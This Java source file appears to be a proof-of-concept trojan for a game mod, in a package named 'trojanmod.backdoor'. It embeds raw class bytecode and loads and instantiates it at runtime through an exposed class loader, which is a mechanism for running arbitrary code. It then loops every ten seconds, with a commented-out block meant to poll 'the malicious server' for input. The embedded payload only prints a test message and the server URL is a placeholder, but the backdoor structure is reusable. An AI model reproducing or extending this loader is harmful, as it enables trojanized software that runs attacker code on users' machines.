package com.lanceg.trojanmod.backdoor;

import java.nio.ByteBuffer;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ServerListener implements Runnable {
	private static final long QUERY_INTERVAL_MILLIS = 10000;
	private static final String SERVER_URL = "https://www.google.com";
	private static final Logger LOGGER = LogManager.getLogger();
	
	private ClassLoader classLoader;
	
	private byte[] classDef = {-54, -2, -70, -66, 0, 0, 0, 52, 0, 20, 7, 0, 2, 1, 0, 48, 99, 111, 109, 47, 108, 97, 110, 99, 101, 103, 47, 116, 114, 111, 106, 97, 110, 109, 111, 100, 47, 98, 97, 99, 107, 100, 111, 111, 114, 47, 65, 114, 98, 105, 116, 114, 97, 114, 121, 84, 101, 115, 116, 67, 108, 97, 115, 115, 7, 0, 4, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 10, 0, 3, 0, 9, 12, 0, 5, 0, 6, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 50, 76, 99, 111, 109, 47, 108, 97, 110, 99, 101, 103, 47, 116, 114, 111, 106, 97, 110, 109, 111, 100, 47, 98, 97, 99, 107, 100, 111, 111, 114, 47, 65, 114, 98, 105, 116, 114, 97, 114, 121, 84, 101, 115, 116, 67, 108, 97, 115, 115, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 8, 0, 17, 1, 0, 43, 83, 111, 109, 101, 32, 97, 114, 98, 105, 116, 114, 97, 114, 121, 32, 99, 111, 100, 101, 32, 104, 97, 115, 32, 106, 117, 115, 116, 32, 98, 101, 101, 110, 32, 101, 120, 101, 99, 117, 116, 101, 100, 46, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 23, 65, 114, 98, 105, 116, 114, 97, 114, 121, 84, 101, 115, 116, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 0, 33, 0, 1, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 8, -79, 0, 0, 0, 2, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 11, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 12, 0, 13, 0, 0, 0, 1, 0, 14, 0, 15, 0, 1, 0, 7, 0, 0, 0, 45, 0, 1, 0, 1, 0, 0, 0, 3, 18, 16, -80, 0, 0, 0, 2, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 6, 0, 11, 0, 0, 0, 12, 0, 1, 0, 0, 0, 3, 0, 12, 0, 13, 0, 0, 0, 1, 0, 18, 0, 0, 0, 2, 0, 19};
	
	public ServerListener() {
		LOGGER.error("CONSTRUCTING SERVER LISTENER");
		
		try {
			LOGGER.info("Trying to get classloader");
			classLoader = ServerListener.class.getClassLoader();
			LOGGER.info("Got the classloader: " + classLoader.toString());
		} catch (Exception e) {
			LOGGER.error(e.getMessage());
		}
	}

	@Override
	public void run() {
		long previousTimeMillis = 0;
		long currentTimeMillis;
		
		for (Package p : classLoader.getDefinedPackages()) {
			LOGGER.info("package: " + p.getName());
		}
		
		LOGGER.error("DEFINING ARBITRARY CLASS:");
		final String name = "com.lanceg.trojanmod.backdoor.ArbitraryTestClass";
		final ByteBuffer buf = ByteBuffer.wrap(classDef);
		
		try {
			final ClassLoader loader = ClassLoader.getSystemClassLoader();
			
			final Class<?> classObject = ClassLoaderExposer.defineClass(loader, name, buf, null);
			LOGGER.info("DEFINED CLASS: " + classObject.toString());
			LOGGER.info("INSTANTIATING...");
			final Object object = classObject.newInstance();
			LOGGER.info("TOSTRING OUTPUT: " + object.toString());
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		while (true) {
			currentTimeMillis = System.currentTimeMillis();
			
			if ((currentTimeMillis - previousTimeMillis) > QUERY_INTERVAL_MILLIS) {
				LOGGER.info("Attempting query...");
				final Path currentRelativePath = Paths.get("");
				final String s = currentRelativePath.toAbsolutePath().toString();
				LOGGER.info("PATH: " + s);
				
				// query the malicious server
				/*
				try (BufferedReader reader = new BufferedReader(new InputStreamReader(new URL(SERVER_URL).openStream(), "UTF-8"))){
					for (String line; (line = reader.readLine()) != null;) {
						LOGGER.info(line);
					}
				} catch (Exception e) {
					LOGGER.error("An error occurred!");
					LOGGER.catching(e);
				}
				*/
			
				previousTimeMillis = currentTimeMillis;
			}
		}
	}

}
